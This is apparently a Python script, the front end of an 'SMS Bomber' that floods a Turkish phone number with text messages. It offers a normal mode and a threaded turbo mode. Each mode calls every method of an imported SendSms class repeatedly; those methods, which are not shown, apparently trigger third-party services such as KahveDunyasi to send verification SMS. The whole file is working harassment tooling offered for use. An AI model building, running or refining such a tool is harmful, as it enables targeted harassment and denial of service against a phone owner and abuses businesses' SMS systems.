from colorama import Fore, Style
from time import sleep
from os import system
from sms import SendSms
import threading

servisler_sms = []
for attribute in dir(SendSms):
    attribute_value = getattr(SendSms, attribute)
    if callable(attribute_value):
        if attribute.startswith('__') == False:
            servisler_sms.append(attribute)


while 1:
    system("cls||clear")
    print("""{}
   ___   ___  _  __      ___  ___ _  _ ___
  / __| / _ \| |/ /     |_ _|/ __| \| |_ _|
  \__ \| (_) | ' <       | | \__ \ .` || |
  |___/ \___/|_|\_\     |___||___/_|\_|___|
  0312 SMS Bomber - {} Services
    """.format(Fore.LIGHTCYAN_EX, len(servisler_sms)))
    try:
        menu = (input(Fore.LIGHTMAGENTA_EX + " 1- SMS Send (Normal)\n\n 2- SMS Send (Turbo)\n\n 3- Exit\n\n" + Fore.LIGHTYELLOW_EX + " Choice: "))
        if menu == "":
            continue
        menu = int(menu)
    except ValueError:
        system("cls||clear")
        print(Fore.LIGHTRED_EX + "Invalid input. Try again.")
        sleep(3)
        continue
    if menu == 1:
        system("cls||clear")
        phone = input(Fore.LIGHTCYAN_EX + "Phone (05XX...): " + Fore.LIGHTYELLOW_EX)
        while not phone.isdigit() or not len(phone) == 11:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Invalid phone number. Must be 11 digits (05XX...).")
            phone = input(Fore.LIGHTCYAN_EX + "Phone (05XX...): " + Fore.LIGHTYELLOW_EX)
        mail = input(Fore.LIGHTCYAN_EX + "Email (optional): " + Fore.LIGHTYELLOW_EX)
        sms = SendSms(phone, mail)
        for i in range(10):
            thrd = threading.Thread(target=sms.KahveDunyasi, args=())
            thrd.start()
            thrd.join()
            print(Fore.LIGHTGREEN_EX + f"Sending SMS to {phone} [{i+1}/10] - KahveDunyasi")
        if mail != "":
            pass
        else:
            for i in range(30):
                for x in servisler_sms:
                    thrd = threading.Thread(target=getattr(sms, x), args=())
                    thrd.start()
                    thrd.join()
                    print(Fore.LIGHTGREEN_EX + f"Sending SMS to {phone} [{i+1}/30] - {x}")
                    sleep(0.5)
        input(Fore.LIGHTRED_EX + "\n\nPress Enter to continue...")
    elif menu == 2:
        system("cls||clear")
        phone = input(Fore.LIGHTCYAN_EX + "Phone (05XX...): " + Fore.LIGHTYELLOW_EX)
        while not phone.isdigit() or not len(phone) == 11:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Invalid phone number. Must be 11 digits (05XX...).")
            phone = input(Fore.LIGHTCYAN_EX + "Phone (05XX...): " + Fore.LIGHTYELLOW_EX)
        mail = input(Fore.LIGHTCYAN_EX + "Email (optional): " + Fore.LIGHTYELLOW_EX)
        sms = SendSms(phone, mail)
        count = int(input(Fore.LIGHTMAGENTA_EX + "SMS count per service: " + Fore.LIGHTYELLOW_EX))
        system("cls||clear")
        for i in range(count):
            threads = []
            for x in servisler_sms:
                thrd = threading.Thread(target=getattr(sms, x), args=())
                threads.append(thrd)
                thrd.start()
                print(Fore.LIGHTGREEN_EX + f"[{i+1}/{count}] Sending SMS via {x}")
            for thrd in threads:
                thrd.join()
        input(Fore.LIGHTRED_EX + f"\n\nProcess completed. Total: {count} SMS sent. Press Enter to continue...")
    elif menu == 3:
        break
